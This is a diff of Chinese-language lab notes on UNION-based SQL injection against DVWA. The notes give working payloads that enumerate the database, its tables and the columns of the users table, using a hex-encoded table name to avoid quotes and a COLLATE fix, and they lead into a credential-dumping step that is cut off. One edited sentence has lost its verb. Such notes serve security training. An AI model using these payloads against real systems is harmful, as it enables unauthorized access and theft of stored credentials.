@@ -50,7 +50,7 @@
 - **查库名：** `id=0 union select 1,database()&Submit=Submit`
 - **查表名：** `id=0 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()&Submit=Submit` 
 > [!note] 
-> 避免dvwa 和sql 字符集排序冲突，在 group_concat(table_name)后面加上COLLATE utf8_general_ci
+> 避免dvwa 和sql 字符集排序冲突，在 `group_concat(table_name)`和`COLLATE utf8_general_ci`
 
 ---
 
@@ -68,7 +68,7 @@
 - **查 users 表的字段名（完美绕过单引号）：**
     
     ```text
-    id=0 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273&Submit=Submit
+    id=0 union select 1,group_concat(column_name) COLLATE utf8_general_ci from information_schema.columns where table_name=0x7573657273&Submit=Submit
     ```
     
 - **直接脱裤（提取账号和密码）：**
